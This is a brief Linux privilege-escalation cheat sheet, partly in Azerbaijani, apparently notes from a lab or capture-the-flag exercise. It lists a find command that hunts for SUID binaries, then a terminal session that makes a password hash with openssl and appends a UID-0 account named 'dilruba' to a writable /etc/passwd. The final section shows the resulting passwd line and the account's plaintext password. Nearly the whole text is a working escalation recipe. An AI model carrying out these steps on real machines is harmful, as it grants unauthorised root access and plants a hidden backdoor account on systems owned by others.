## SHOWING SUID
 find / -perm -u=s -type f 2>/dev/null



## ROOTA QALXMAQ etc/passwd -e yaza biliriksə


user7@polobox:/$ openssl passwd -1
Password: 
Verifying - Password: 
$1$.wwZIHut$tbO9u/NbSlGA/IkwxDcEX0
user7@polobox:/$ ^C
user7@polobox:/$ nano /etc/passwd
user7@polobox:/$ su dilruba


## Nəticə

dilruba:$1$.wwZIHut$tbO9u/NbSlGA/IkwxDcEX0:0:0:root:/root:/bin/bash
passwd----dil1123
